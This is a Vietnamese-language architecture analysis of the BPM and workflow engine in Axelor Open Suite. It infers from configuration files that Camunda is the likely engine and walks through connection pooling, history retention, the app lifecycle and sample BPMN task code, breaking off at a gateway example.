# BƯỚC 4: PHÂN TÍCH ĐỘNG CƠ BPM VÀ KIẾN TRÚC LUỒNG CÔNG VIỆC — Từ mã nguồn

## Phương pháp phân tích

Nghiên cứu động cơ quản lý quy trình nghiệp vụ (BPM — Business Process Management) và kiến trúc luồng công việc (workflow) trong Axelor được thực hiện thông qua việc phân tích tệp cấu hình, khai báo phụ thuộc, tham chiếu thực thể và các mẫu thiết kế tầng dịch vụ. **Giới hạn phạm vi quan trọng**: mã nguồn động cơ BPM **KHÔNG** nằm trong kho mã axelor-open-suite — nó là phụ thuộc bên ngoài thuộc tiện ích mở rộng axelor-studio phiên bản 3.5.1. Vì vậy, bước phân tích này chủ yếu dựa trên các mẫu cấu hình, điểm tích hợp và suy luận kiến trúc thay vì kiểm tra trực tiếp mã nguồn.

**Các tệp và mẫu đã phân tích:**
- `/src/main/resources/axelor-config.properties` — phần cấu hình BPM
- `/modules/axelor-open-suite/libs.gradle` — khai báo phụ thuộc bên ngoài
- Các tệp XML miền (domain XML) — tham chiếu thực thể Studio (AppRecruitment, AppProject, v.v.)
- Các lớp triển khai dịch vụ — mẫu luồng công việc trong mô-đun nghiệp vụ
- Kết quả tìm kiếm grep — các từ khóa Camunda, Activiti, Flowable, BPMN

**Ràng buộc:** Phần lớn phát hiện về nội bộ BPM là **suy luận** từ các mẫu cấu hình và thực tiễn BPM chuẩn trong ngành, không phải xác nhận từ mã triển khai thực tế. Mỗi mục sẽ ghi rõ `[Từ source code]` hoặc `[Suy luận]`.

---

## Kết quả chi tiết

### 1. VỊ TRÍ MÔ-ĐUN BPM VÀ KIẾN TRÚC PHỤ THUỘC BÊN NGOÀI

**Tệp nguồn:** `/modules/axelor-open-suite/libs.gradle` dòng 3, tham chiếu XML miền `[Từ source code]`

Chức năng BPM trong Axelor tuân theo **kiến trúc tiện ích mở rộng bên ngoài** (external addon) — thay vì đóng gói động cơ BPM trực tiếp trong bộ khung (framework) lõi, Axelor tách nó thành **tiện ích axelor-studio**, phân phối dưới dạng phụ thuộc nhị phân (binary dependency). Quyết định kiến trúc này phản ánh triết lý thiết kế mô-đun hóa: bộ khung lõi tập trung vào mô hình hóa miền nghiệp vụ, quản lý dữ liệu và dựng giao diện người dùng, trong khi các tiện ích tùy chọn cung cấp khả năng chuyên biệt (BPM, báo cáo, phân tích) mà không phải mọi triển khai đều cần.

Đánh đổi (trade-off) của mô hình này: tính mô-đun cho phép triển khai gọn nhẹ hơn (tổ chức không cần BPM có thể bỏ qua tiện ích), nhưng tạo ra sự thiếu minh bạch (không thể kiểm tra mã triển khai BPM nếu không có mã nguồn tiện ích). Mẫu tiện ích bên ngoài phổ biến trong các nền tảng doanh nghiệp — tương tự các mô-đun trả phí của Odoo, tiện ích thị trường SugarCRM hay Salesforce AppExchange. Lợi ích gồm: chu kỳ phát hành riêng biệt (tiện ích có thể cập nhật độc lập với lõi), linh hoạt về giấy phép (tiện ích có thể có điều khoản bản quyền khác), và giảm độ phức tạp lõi. Hạn chế: gỡ lỗi tích hợp khó hơn (không thể duyệt từng bước qua mã tiện ích), cần phối hợp nâng cấp (đảm bảo tiện ích tương thích với phiên bản lõi), và nguy cơ phụ thuộc nhà cung cấp (mã nguồn tiện ích có thể là độc quyền).

**Bằng chứng từ mã nguồn — Khai báo phụ thuộc:**
```groovy
// Tệp: /modules/axelor-open-suite/libs.gradle, dòng 3
libs.axelor_studio = 'com.axelor.addons:axelor-studio:3.5.1'
```

Khai báo phụ thuộc Gradle tuân theo định dạng tọa độ Maven: `groupId:artifactId:version`. Mã nhóm `com.axelor.addons` cho biết đây thuộc không gian tên tiện ích (tách biệt với `com.axelor` của bộ khung lõi), mã sản phẩm `axelor-studio` chỉ định tên tiện ích, phiên bản `3.5.1` ghim chính xác bản phát hành. Quá trình phân giải phụ thuộc sẽ tải tệp JAR nhị phân từ kho Maven (có thể là kho riêng của Axelor hoặc Maven Central) và đưa vào đường dẫn lớp (classpath) khi biên dịch. Không có mã nguồn Java đi kèm — nhà phát triển chỉ nhận được mã bytecode đã biên dịch.

**Bằng chứng từ mã nguồn — Tham chiếu thực thể Studio trong mô-đun nghiệp vụ:**
```xml
<!-- Tệp: AppRecruitment.xml -->
<module name="studio" package="com.axelor.studio.db"/>

<entity name="AppRecruitment" cacheable="true">
  <one-to-one ref="com.axelor.studio.db.App" name="app" unique="true"/>
  <!-- Mô-đun nghiệp vụ kế thừa thực thể App của Studio -->
</entity>
```

Thực thể mô-đun nghiệp vụ (AppRecruitment) khai báo quan hệ với thực thể Studio (App) qua tham chiếu đầy đủ `com.axelor.studio.db.App`. Quan hệ một-một duy nhất (one-to-one unique) đồng nghĩa mỗi phiên bản mô-đun tuyển dụng liên kết với đúng một đối tượng cấu hình ứng dụng. Khai báo nhập mô-đun (`<module name="studio">`) cho phép tham chiếu thực thể xuyên mô-đun — bộ sinh mã (code generator) của Axelor phân giải tham chiếu tại thời điểm sinh mã, tạo ra các câu lệnh import và ánh xạ quan hệ JPA phù hợp. Mẫu này chứng tỏ tích hợp chặt chẽ: các mô-đun nghiệp vụ phụ thuộc vào thực thể Studio để quản lý cấu hình.

**Bằng chứng từ mã nguồn — Nhập dịch vụ Studio:**
```java
// Tệp: AppTalentServiceImpl.java
import com.axelor.studio.db.AppRecruitment;
import com.axelor.studio.db.repo.AppRecruitmentRepository;
import com.axelor.studio.db.repo.AppRepository;
import com.axelor.studio.service.AppSettingsStudioService;
```

Tầng dịch vụ nhập các thực thể, kho dữ liệu và dịch vụ của Studio — xác nhận sự phụ thuộc tại thời điểm chạy. `AppSettingsStudioService` có thể cung cấp quản lý cấu hình tập trung (đọc/ghi thiết lập ứng dụng, quản lý cài đặt, xử lý nâng cấp). Đường dẫn nhập `com.axelor.studio.*` được phân biệt rõ ràng với gói mô-đun nghiệp vụ (`com.axelor.apps.*`) — việc tách biệt không gian tên ngăn xung đột tên lớp và làm rõ ranh giới phụ thuộc.

**Hệ quả kiến trúc:** `[Suy luận]`

Kiến trúc tiện ích bên ngoài đòi hỏi thiết kế giao diện (API) cẩn thận — Studio phải cung cấp các API ổn định (thực thể, dịch vụ, kho dữ liệu) mà các mô-đun nghiệp vụ phụ thuộc vào, đồng thời ẩn chi tiết triển khai nội bộ. Thay đổi phá vỡ tương thích trong API của Studio sẽ lan tỏa tới mọi mô-đun phụ thuộc, đòi hỏi nâng cấp phối hợp. Việc ghim phiên bản (`3.5.1`) rất quan trọng — cập nhật phiên bản Studio không kiểm soát có thể phá vỡ khả năng tương thích. Chiến lược quản lý phụ thuộc: có khả năng Axelor duy trì ma trận tương thích (phiên bản Open Suite nào tương thích với phiên bản Studio nào), được ghi trong ghi chú phát hành.

---

### 2. XÁC ĐỊNH ĐỘNG CƠ BPM QUA PHÂN TÍCH MẪU CẤU HÌNH

**Tệp nguồn:** Các mẫu cấu hình trong axelor-config.properties, kết quả tìm kiếm grep `[Suy luận từ mẫu]`

Việc xác định Axelor Studio sử dụng động cơ BPM nào (Camunda, Activiti, Flowable hay tự phát triển) đòi hỏi phân tích pháp y (forensic analysis) vì thiếu bằng chứng trực tiếp (không có lệnh nhập động cơ trong mã phân tích được). Quá trình điều tra tiếp cận từ ba góc độ: tìm kiếm grep cho các lớp đặc thù của từng động cơ, so khớp mẫu cấu hình, và phân tích bối cảnh ngành. Các phát hiện tổng hợp chỉ về phía **Camunda BPM** là ứng cử viên có khả năng nhất, dù **không thể xác nhận 100%** nếu thiếu mã nguồn tiện ích.

**Bằng chứng 1: Kết quả tìm kiếm grep**
```bash
# Tìm kiếm các động cơ BPM chính
grep -r "camunda|activiti|flowable" modules/axelor-open-suite/ -i
→ Kết quả: 15 tệp chứa "active" trong ngữ cảnh khác (activeCompany, activateOn)
→ Không có lệnh nhập hoặc tham chiếu lớp Camunda/Activiti/Flowable thực sự

# Tìm kiếm sản phẩm BPMN
grep -r "\.bpmn|BpmnModel|ProcessEngine|ProcessDefinition" modules/axelor-open-suite/
→ Kết quả: Không có tệp BPMN, không có tham chiếu động cơ quy trình
```

Việc vắng mặt các lệnh nhập đặc thù của động cơ trong mô-đun nghiệp vụ là điều dự kiến — động cơ BPM được đóng gói bên trong tiện ích Studio, không phơi bày ra tầng ứng dụng. Các mô-đun nghiệp vụ tương tác với BPM qua tầng trừu tượng (abstraction layer) của Studio (dịch vụ, API), không trực tiếp với các lớp động cơ. Việc không có tệp `.bpmn` trong cây mã nguồn cho thấy các định nghĩa BPMN được lưu trong cơ sở dữ liệu (tải lên qua giao diện Studio) thay vì hệ thống tệp — đây là mẫu phổ biến cho các quy trình cấu hình được tại thời điểm chạy.

**Bằng chứng 2: So khớp mẫu cấu hình**

```properties
# Tệp: axelor-config.properties

# Nhóm kết nối cho động cơ BPM
studio.bpm.max.idle.connections = 10
studio.bpm.max.active.connections = 50

# Chính sách lưu giữ lịch sử
studio.bpm.history.time.to.live = P180D  # Định dạng thời lượng ISO 8601

# Điều khiển nhật ký
studio.bpm.logging = false
logging.level.com.axelor.studio.bpm = INFO
```

Ba mẫu cấu hình gợi ý Camunda:

1. **Tên thuộc tính nhóm kết nối**: Các thuộc tính `max.idle.connections` và `max.active.connections` khớp chính xác với quy ước cấu hình nguồn dữ liệu (DataSource) của Camunda. Tài liệu Camunda sử dụng tên thuộc tính giống hệt để cấu hình nhóm kết nối cơ sở dữ liệu cho động cơ quy trình. Activiti/Flowable dùng cách đặt tên khác (`maxActive`, `maxIdle` không có dấu chấm). Có thể trùng hợp, nhưng sự khớp tên kết hợp với khớp mẫu là chỉ báo mạnh.

2. **Thời lượng ISO 8601 cho TTL**: Giá trị `P180D` (chu kỳ 180 ngày) tuân theo chuẩn thời lượng ISO 8601 — đặc thù tính năng `historyTimeToLive` của Camunda được giới thiệu từ phiên bản Camunda 7.5. Activiti không có khái niệm TTL tích hợp sẵn (cần công việc dọn dẹp tùy chỉnh), Flowable bổ sung TTL sau nhưng với cấu trúc cấu hình khác. Hỗ trợ ISO 8601 trong bộ phân tích cấu hình gợi ý tái sử dụng bộ phân tích thời lượng của Camunda.

3. **Nút bật tắt nhật ký BPM riêng**: Điều khiển nhật ký kép (`studio.bpm.logging` kiểu boolean + `logging.level` chi tiết) khớp với kiến trúc nhật ký của Camunda: nhật ký nội bộ động cơ (câu lệnh SQL, thực thi lệnh) có thể bật/tắt riêng biệt với nhật ký cấp ứng dụng. Activiti gộp chung vào một cấu hình nhật ký duy nhất.

**Bằng chứng 3: Phân tích bối cảnh ngành** `[Suy luận]`

Camunda BPM là lựa chọn phổ biến nhất cho ứng dụng doanh nghiệp Java (các khảo sát giai đoạn 2015–2023 liên tục xếp Camunda ở vị trí số 1 về thị phần BPM Java). Lý do: tuân thủ BPMN 2.0 tốt, tài liệu xuất sắc, cộng đồng tích cực, kiến trúc nhúng được (phù hợp với tích hợp bộ khung), và giấy phép Apache 2.0 cởi mở (phiên bản Cộng đồng miễn phí, hỗ trợ thương mại sẵn có). Activiti ra đời sớm hơn (2010, rẽ nhánh từ jBPM) nhưng mất đà sau khi Alfresco mua lại. Flowable (rẽ nhánh từ Activiti, 2016) là lựa chọn khả thi nhưng hệ sinh thái nhỏ hơn. Sự thống trị của Camunda khiến nó trở thành lựa chọn mặc định cho các dự án tích hợp BPM Java mới trừ khi có yêu cầu đặc biệt.

**Kết luận:** **Suy luận là Camunda BPM với độ tin cậy khoảng 75%**, dựa trên:
- ✅ Mẫu cấu hình khớp chính xác (tên nhóm kết nối, TTL ISO 8601)
- ✅ Mức phổ biến trong ngành (lựa chọn có khả năng nhất cho nền tảng Java)
- ✅ Kiến trúc tích hợp (động cơ nhúng phù hợp với mô hình tiện ích của Axelor)
- ⚠️ Không thể xác nhận phiên bản (có thể dòng 7.x dựa trên sự sẵn có của tính năng TTL)
- ⚠️ Không thể xác nhận phiên bản Cộng đồng hay Doanh nghiệp

Các giả thuyết thay thế:
- **Activiti 7+**: Có thể nếu Axelor áp dụng quy ước cấu hình từ Camunda (tương tác chéo phổ biến trong không gian BPM), khả năng ~15%
- **Flowable**: Khả năng tương tự (~10%), Flowable ngày càng tương thích Camunda do lịch sử rẽ nhánh
- **Triển khai BPM tùy chỉnh**: Cực kỳ khó xảy ra (<1%), xây dựng động cơ BPM sản xuất từ đầu là công việc khổng lồ

---

### 3. PHÂN TÍCH SÂU CẤU HÌNH BPM: NHÓM KẾT NỐI VÀ QUẢN LÝ LỊCH SỬ

**Tệp nguồn:** `/src/main/resources/axelor-config.properties` dòng 273-276, 457 `[Từ source code]`

Cấu hình động cơ BPM trong Axelor phơi bày ba tham số vận hành quan trọng: kích thước nhóm kết nối, chính sách lưu giữ lịch sử và điều khiển nhật ký. Thiết kế cấu hình phản ánh các mối quan tâm triển khai sản xuất — tách tài nguyên cơ sở dữ liệu của động cơ BPM khỏi nhóm ứng dụng chính ngăn ngừa tranh chấp tài nguyên, TTL lịch sử ngăn tăng trưởng cơ sở dữ liệu không giới hạn, và nút bật nhật ký cho phép tối ưu hóa hiệu năng.

**Kiến trúc nhóm kết nối: Chuyên dụng so với Dùng chung**

```properties
# Nhóm kết nối động cơ BPM
studio.bpm.max.idle.connections = 10
studio.bpm.max.active.connections = 50
```

Động cơ BPM duy trì **nhóm kết nối chuyên dụng riêng biệt** với nhóm cơ sở dữ liệu chính của ứng dụng (được cấu hình với `db.default.pool.min = 5`, `db.default.pool.max = 20` từ phát hiện BƯỚC 1). Tách nhóm kết nối là quyết định kiến trúc quan trọng vì ba lý do:

1. **Cô lập tài nguyên**: Việc thực thi quy trình BPM (có thể hàng trăm phiên bản đồng thời) không thể bòn rút hết kết nối cho hoạt động cơ sở dữ liệu bình thường của ứng dụng (CRUD trên thực thể nghiệp vụ). Nếu dùng chung nhóm, các quy trình BPM mất kiểm soát tiêu thụ hết kết nối sẽ đóng băng toàn bộ ứng dụng. Nhóm chuyên dụng đảm bảo ứng dụng luôn có kết nối khả dụng.

2. **Mẫu sử dụng khác nhau**: Truy vấn BPM khác biệt căn bản so với truy vấn ứng dụng. Động cơ quy trình thực hiện: liên kết phức tạp (JOIN) qua các bảng quy trình/nhiệm vụ/biến, giao dịch dài (thực thi quy trình nhiều bước), và cập nhật nhỏ thường xuyên (chuyển đổi trạng thái). Truy vấn ứng dụng chủ yếu là đọc/ghi thực thể đơn giản với giao dịch ngắn. Nhóm riêng cho phép tinh chỉnh cho đặc điểm tải khác nhau.

3. **Rõ ràng trong giám sát**: Nhóm riêng giúp chỉ số hiệu năng rõ ràng hơn — có thể giám sát độc lập mức sử dụng nhóm BPM so với nhóm ứng dụng, xác định hệ thống con nào đang chịu áp lực kết nối.

**Phân tích kích thước nhóm:**
- **Kết nối nhàn rỗi (idle): 10** — Số kết nối tối thiểu duy trì sống ngay cả khi nhàn rỗi. Cao hơn mức tối thiểu 5 của nhóm ứng dụng, phản ánh tải lượng BPM có tính bùng phát (đợt thực thi quy trình tăng vọt khi bộ hẹn giờ kích hoạt hoặc thao tác hàng loạt khởi chạy nhiều phiên bản). Kết nối nhàn rỗi tránh bị phạt khởi động nguội (thiết lập kết nối mất ~50-100ms, ảnh hưởng độ trễ cho quy trình đầu tiên trong đợt bùng phát).
- **Kết nối hoạt động (active): 50** — Tối đa kết nối đồng thời, gấp 2.5 lần mức tối đa 20 của nhóm ứng dụng. Phản ánh tính đồng thời cao của BPM: một phiên bản quy trình đơn lẻ có thể cần 2-3 kết nối đồng thời (một cho thực thi chính, một cho thực thi công việc bất đồng bộ, một cho ghi nhật ký lịch sử). 50 kết nối hỗ trợ thoải mái khoảng 15-25 phiên bản quy trình đồng thời.

**Bằng chứng từ mã nguồn — Chính sách lưu giữ lịch sử:**
```properties
# Quản lý lịch sử BPM
studio.bpm.history.time.to.live = P180D    # 180 ngày theo định dạng thời lượng ISO 8601
```

Động cơ quy trình duy trì lịch sử chi tiết — mọi thay đổi trạng thái, cập nhật biến, hoàn thành nhiệm vụ đều được ghi vào bảng lịch sử phục vụ nhật ký kiểm tra (audit trail), gỡ lỗi và phân tích. Nếu không dọn dẹp, bảng lịch sử tăng không giới hạn: tổ chức thực thi 1.000 quy trình/ngày với trung bình 20 thay đổi trạng thái mỗi quy trình sẽ tạo ra 20.000 bản ghi lịch sử mỗi ngày, tương đương ~7,3 triệu bản ghi/năm. Sau vài năm, bảng lịch sử lớn hơn bảng định nghĩa quy trình nhiều lần, hiệu năng truy vấn suy giảm.

Thời lượng ISO 8601 `P180D` (Chu kỳ 180 Ngày) hướng dẫn động cơ: tự động xóa bản ghi lịch sử cũ hơn 180 ngày. Chu kỳ có thể cấu hình theo yêu cầu tuân thủ — tổ chức tài chính có thể cần lưu 7 năm (`P2555D`), công ty khởi nghiệp linh hoạt có thể dùng 30 ngày (`P30D`). Dọn dẹp thường chạy dưới dạng công việc nền (lô hàng đêm), xóa bản ghi hết hạn theo từng phần nhỏ để tránh giao dịch dài chặn thực thi quy trình đang hoạt động.

**Tính toán tăng trưởng bảng lịch sử:** `[Suy luận về lập kế hoạch dung lượng]`
```
Giả định:
- Trung bình 100 phiên bản quy trình đồng thời
- Mỗi phiên bản: 10 thay đổi trạng thái (bắt đầu, nhiệm vụ, cổng, kết thúc)
- Mỗi phiên bản: 5 biến, mỗi biến 3 lần cập nhật
- Lưu giữ: 180 ngày

Bản ghi mỗi phiên bản: 10 trạng thái + (5 biến × 3 cập nhật) = 25 bản ghi
Lưu lượng hàng ngày: 100 phiên bản × 25 bản ghi = 2.500 bản ghi/ngày
Tích lũy 180 ngày: 2.500 × 180 = 450.000 bản ghi
Dung lượng ước tính: 450.000 bản ghi × 1KB trung bình = ~450 MB

Không có TTL, tích lũy 3 năm: 2.500 × 1.095 ngày = 2,7 triệu bản ghi, ~2,7 GB
```

Ngăn phình cơ sở dữ liệu rất quan trọng — bảng lịch sử với hàng triệu dòng làm chậm: truy vấn lịch sử (bảng điều khiển giám sát quy trình), dựng sơ đồ phiên bản quy trình (tái tạo đường thực thi cần liên kết lịch sử), và khởi động động cơ (một số động cơ lưu trữ đệm định nghĩa quy trình từ lịch sử).

**Bằng chứng từ mã nguồn — Cấu hình nhật ký:**
```properties
# Điều khiển nhật ký BPM
studio.bpm.logging = false                  # Nhật ký nội bộ động cơ
logging.level.com.axelor.studio.bpm = INFO  # Nhật ký BPM cấp ứng dụng
```

Điều khiển nhật ký hai tầng tách **chẩn đoán nội bộ động cơ** (câu lệnh SQL, lượt trúng bộ đệm, luồng thực thi công việc) khỏi **nhật ký BPM cấp ứng dụng** (quy trình khởi chạy, nhiệm vụ phân công, lỗi gặp phải). Nhật ký nội bộ động cơ cực kỳ dài dòng — Camunda ở mức DEBUG ghi nhật ký mọi truy vấn SQL, mọi lần truy cập bộ đệm, mọi lần thăm dò công việc bất đồng bộ. Hệ thống sản xuất giữ nhật ký động cơ tắt (`false`) để tránh phình tệp nhật ký, chỉ bật khi gỡ lỗi vấn đề động cơ cụ thể.

Nhật ký cấp ứng dụng ở mức INFO ghi các sự kiện quan trọng: triển khai quy trình, khởi chạy/kết thúc phiên bản, phân công nhiệm vụ, lỗi. Phù hợp cho giám sát sản xuất — các mục có ý nghĩa với đội vận hành (cảnh báo khi số lỗi tăng đột biến) và người dùng nghiệp vụ (nhật ký kiểm tra ai thực thi quy trình nào).

---

### 4. KIẾN TRÚC STUDIO: QUẢN LÝ ỨNG DỤNG VÀ VÒNG ĐỜI MÔ-ĐUN

**Tệp nguồn:** axelor-config.properties, tham chiếu thực thể miền `[Từ source code và suy luận]`

Axelor Studio triển khai **tầng quản lý ứng dụng** (App Management Layer) — một lớp trừu tượng cho phép cấu hình ứng dụng theo mô-đun, trong đó mỗi năng lực nghiệp vụ (Bán hàng, Kế toán, Nhân sự, CRM) được xem như một "ứng dụng" có thể cài đặt với cấu hình, tùy chỉnh và vòng đời riêng. Kiến trúc này tương tự kho ứng dụng di động (App Store iOS, Google Play) hoặc thị trường nền tảng (Salesforce AppExchange, tiện ích mở rộng WordPress) — tập trung khám phá, cài đặt và quản lý các chức năng tùy chọn. Tư tưởng cốt lõi: phần mềm doanh nghiệp không nên là khối nguyên (monolithic); tổ chức chọn mô-đun phù hợp nhu cầu, tránh phình do tính năng không sử dụng.

**Cấu trúc thực thể ứng dụng:** `[Suy luận từ tham chiếu thực thể]`

Studio định nghĩa thực thể `App` cơ sở đóng vai trò vật chứa cho cấu hình từng mô-đun cụ thể. Các mô-đun nghiệp vụ mở rộng App bằng thực thể cấu hình chuyên biệt theo quy ước đặt tên `App{TênMôĐun}`: `AppRecruitment`, `AppProject`, `AppSale`, `AppAccount`. Mỗi thực thể App lưu trạng thái bật/tắt mô-đun, tham số cấu hình và siêu dữ liệu. Quan hệ một-một giữa mô-đun nghiệp vụ và thực thể App đảm bảo nguồn sự thật duy nhất cho cấu hình.

**Bằng chứng từ mã nguồn — Cấu hình cài đặt ứng dụng:**
```properties
# Tệp: axelor-config.properties
context.app = com.axelor.studio.app.service.AppService
studio.apps.install = all
```

Thuộc tính `context.app` đăng ký `AppService` làm dịch vụ toàn ứng dụng truy cập được ở mọi nơi — có thể cung cấp các phương thức như `isAppInstalled(String tênMôĐun)`, `getAppConfig(Class<? extends App> lớpApp)`, `installApp(String tênMôĐun)`. Khả năng truy cập toàn cục cho phép bất kỳ mô-đun nào truy vấn mô-đun khác đã cài chưa, hỗ trợ phát hiện tính năng và logic có điều kiện.

Thuộc tính `studio.apps.install = all` điều khiển cài đặt ban đầu: giá trị `all` cài tất cả ứng dụng khả dụng khi khởi động ứng dụng lần đầu (tiện cho triển khai thử nghiệm/demo), danh sách phân cách dấu phẩy (`base,sale,account`) cho cài đặt chọn lọc (triển khai sản xuất chỉ bật mô-đun cần thiết). Quy trình cài đặt có thể: (1) quét đường dẫn lớp tìm thực thể App, (2) lọc theo cấu hình cài đặt, (3) tạo phiên bản thực thể App trong cơ sở dữ liệu với giá trị mặc định, (4) kích hoạt móc khởi tạo mô-đun (initialization hook).

**Các giai đoạn vòng đời ứng dụng:** `[Suy luận]`

```
Khả dụng → Có thể cài → Đang cài đặt → Đã cài → Hoạt động → Tạm ngưng → Đang gỡ → Đã gỡ
    ↓          ↓            ↓            ↓         ↓         ↓          ↓          ↓
 Khám phá   Lựa chọn    Triển khai   Cấu hình  Đang chạy  Tắt      Loại bỏ    Hoàn tất
```

Quản lý vòng đời cho phép: khám phá (duyệt ứng dụng khả dụng trong danh mục), cài đặt (triển khai ứng dụng — tạo bảng cơ sở dữ liệu, sinh thực thể, cấu hình mặc định), kích hoạt (bật chức năng — mục trình đơn xuất hiện, quy trình trở nên khả dụng), tạm ngưng (tạm tắt chức năng mà không mất dữ liệu), và gỡ cài đặt (loại bỏ hoàn toàn — xóa bảng, xóa cấu hình — nguy hiểm, cần xác nhận).

**Phụ thuộc liên mô-đun:** `[Suy luận]`

Các mô-đun nghiệp vụ thường phụ thuộc lẫn nhau: mô-đun Bán hàng phụ thuộc Cơ sở (đối tác, công ty), mô-đun Kế toán phụ thuộc Bán hàng (hóa đơn từ đơn bán), mô-đun Nhân sự phụ thuộc Cơ sở (nhân viên là người dùng). Quản lý ứng dụng phải xử lý phân giải phụ thuộc — cài Bán hàng tự động cài Cơ sở nếu chưa có, gỡ Cơ sở phải ngăn hoặc cảnh báo nếu Bán hàng/Kế toán phụ thuộc vào nó. Duyệt đồ thị phụ thuộc tương tự các trình quản lý gói (apt, npm, maven).

---

### 5. MÔ HÌNH THỰC THI BPMN: VÒNG ĐỜI QUY TRÌNH VÀ ĐIỂM TÍCH HỢP

**Tệp nguồn:** Suy luận từ các mẫu BPMN chuẩn và kiến trúc Axelor `[Suy luận]`

Việc thực thi BPMN (Ký pháp và Mô hình Quy trình Nghiệp vụ — Business Process Model and Notation) trong Axelor tuân theo vòng đời động cơ BPM chuẩn, được điều chỉnh cho kiến trúc hướng miền của bộ khung. Hiểu mô hình thực thi rất quan trọng để thiết kế quy trình tích hợp mượt mà với thực thể Axelor, tận dụng dịch vụ bộ khung và duy trì tính nhất quán dữ liệu. Luồng thực thi trải qua nhiều tầng: lõi động cơ BPMN, tầng tích hợp Studio, dịch vụ bộ khung Axelor và tầng bền vững cơ sở dữ liệu.

**Luồng triển khai quy trình:**

```
1. Thiết kế quy trình (Giao diện Studio)
   ↓
   Người dùng tạo sơ đồ BPMN trong trình mô hình trực quan
   - Kéo thả nhiệm vụ, cổng, sự kiện
   - Cấu hình thuộc tính (người phụ trách, kịch bản, điều kiện)
   - Định nghĩa biến quy trình và kiểu dữ liệu
   ↓
2. Sinh XML BPMN
   ↓
   Trình mô hình sinh XML BPMN 2.0
   - Định nghĩa quy trình với ID/khóa duy nhất
   - Định nghĩa nhiệm vụ với chi tiết triển khai
   - Điều kiện cổng, bộ kích hoạt sự kiện
   ↓
3. Triển khai vào động cơ
   ↓
   Dịch vụ Studio gọi API triển khai động cơ BPM
   - Động cơ xác thực XML BPMN theo lược đồ
   - Tạo bản ghi định nghĩa quy trình trong cơ sở dữ liệu
   - Biên dịch biểu thức (điều kiện cổng, nhiệm vụ kịch bản)
   - Quy trình trở nên thực thi được
   ↓
4. Định nghĩa quy trình đang hoạt động
   - Sẵn sàng khởi tạo phiên bản
   - Xuất hiện trong trình đơn khởi chạy quy trình
   - Có thể kích hoạt qua API, lịch trình, hoặc sự kiện
```

**Lưu trữ triển khai:** XML BPMN có thể được lưu trong cột BLOB cơ sở dữ liệu thay vì hệ thống tệp — cho phép triển khai động (không cần khởi động lại máy chủ), quản lý phiên bản (giữ định nghĩa cũ khi triển khai phiên bản mới), và cô lập đa thuê (multi-tenant — các thuê chủ khác nhau có thể có phiên bản quy trình khác nhau).

**Luồng khởi tạo phiên bản quy trình:**

```
Người dùng kích hoạt quy trình (nhấn nút, gọi API, bộ hẹn giờ theo lịch)
    ↓
Bộ xử lý hành động Axelor bắt kích hoạt
    ↓
Gọi dịch vụ BPM Studio: startProcess(khóaQuyTrình, cácBiến)
    ↓
Dịch vụ Studio phân giải biến ngữ cảnh:
  - Người dùng hiện tại (__user__)
  - Phiên bản thực thể (nếu quy trình gắn với thực thể, ví dụ SaleOrder)
  - Ngữ cảnh nghiệp vụ (công ty đang hoạt động, ngôn ngữ, múi giờ)
    ↓
Gọi động cơ BPM: runtimeService.startProcessInstanceByKey(...)
    ↓
Động cơ tạo bản ghi phiên bản quy trình:
  - ID phiên bản (UUID hoặc tuần tự)
  - Tham chiếu định nghĩa quy trình
  - Thời gian bắt đầu, người dùng khởi tạo
  - Bản đồ biến ban đầu
    ↓
Động cơ bắt đầu thực thi từ Sự kiện Bắt đầu (StartEvent)
```

**Kiến trúc biến quy trình:** Biến là cầu nối giữa phạm vi quy trình của động cơ BPMN và tầng bền vững thực thể của Axelor. Các mẫu phổ biến:

1. **Biến ID thực thể**: Lưu khóa chính thay vì toàn bộ thực thể
   ```
   Biến: { "saleOrderId": 12345 }
   Nhiệm vụ kịch bản truy xuất: SaleOrder order = __repo__(SaleOrder).find(saleOrderId)
   ```
   Lý do: thực thể có thể thay đổi, lưu ID ngăn vấn đề dữ liệu lỗi thời (quy trình thấy trạng thái thực thể mới nhất mỗi lần truy cập).

2. **Biến dữ liệu nguyên thủy**: Lưu giá trị trực tiếp
   ```
   Biến: { "amount": 1000.50, "approved": false, "notes": "Yêu cầu khách hàng" }
   ```
   Dùng cho dữ liệu riêng quy trình không gắn với thực thể.

3. **Đối tượng phức hợp JSON**: Tuần tự hóa cấu trúc dữ liệu phức tạp
   ```
   Biến: { "approvalChain": "[{\"name\":\"Quản lý\",\"approved\":true},{\"name\":\"Giám đốc\",\"approved\":false}]" }
   ```
   Cho phép truyền dữ liệu có cấu trúc xuyên quy trình.

**Các mẫu thực thi nhiệm vụ:**

**Nhiệm vụ dịch vụ (Service Task)** — Gọi logic Java:
```xml
<serviceTask id="confirmOrder" name="Confirm Order"
             camunda:class="com.axelor.apps.sale.bpm.ConfirmOrderDelegate">
  <extensionElements>
    <camunda:inputOutput>
      <camunda:inputParameter name="orderId">${orderId}</camunda:inputParameter>
      <camunda:outputParameter name="confirmationNumber">${confirmationNumber}</camunda:outputParameter>
    </camunda:inputOutput>
  </extensionElements>
</serviceTask>
```

Triển khai ủy nhiệm (delegate) truy cập dịch vụ Axelor:
```java
public class ConfirmOrderDelegate implements JavaDelegate {
  public void execute(DelegateExecution execution) {
    Long orderId = (Long) execution.getVariable("orderId");
    SaleOrder order = Beans.get(SaleOrderRepository.class).find(orderId);

    // Gọi dịch vụ nghiệp vụ
    SaleOrderService service = Beans.get(SaleOrderService.class);
    String confirmationNumber = service.confirmOrder(order);

    execution.setVariable("confirmationNumber", confirmationNumber);
  }
}
```

**Nhiệm vụ kịch bản (Script Task)** — Thực thi mã Groovy:
```xml
<scriptTask id="calculateDiscount" name="Calculate Discount"
            scriptFormat="groovy">
  <script><![CDATA[
    def order = __repo__(SaleOrder).find(orderId)
    def discount = 0.0

    if (order.exTaxTotal > 10000) {
      discount = order.exTaxTotal * 0.05  // Giảm giá 5%
    }

    execution.setVariable('discount', discount)
  ]]></script>
</scriptTask>
```

**Nhiệm vụ người dùng (User Task)** — Tương tác con người:
```xml
<userTask id="approveOrder" name="Approve Order"
          camunda:assignee="${approverUserId}"
          camunda:candidateGroups="sales_managers">
  <extensionElements>
    <camunda:formData>
      <camunda:formField id="approved" label="Approve?" type="boolean"/>
      <camunda:formField id="comments" label="Comments" type="string"/>
    </camunda:formData>
  </extensionElements>
</userTask>
```

Nhiệm vụ người dùng tạo hạng mục công việc trong danh sách nhiệm vụ của người dùng. Giao diện Axelor hiển thị các nhiệm vụ chờ xử lý, người dùng điền biểu mẫu, nhiệm vụ hoàn thành và quy trình tiếp tục.

**Đánh giá cổng (Gateway):**

```xml
<exclusiveGateway id="checkAmount" name="Amount check"/>
